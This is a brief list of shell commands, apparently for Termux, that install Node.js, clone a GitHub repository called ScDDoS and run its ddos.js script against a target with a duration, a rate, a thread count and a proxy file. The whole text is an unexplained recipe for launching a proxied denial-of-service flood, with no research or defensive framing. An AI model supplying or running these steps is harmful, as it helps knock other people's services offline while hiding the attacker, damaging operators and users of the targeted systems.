pkg upgrade && pkg update 
pkg install nodejs
git clone https://github.com/Debygood/ScDDoS
cd ScDDoS
npm i
node ddos.js target 120 500 9 proxy.txt
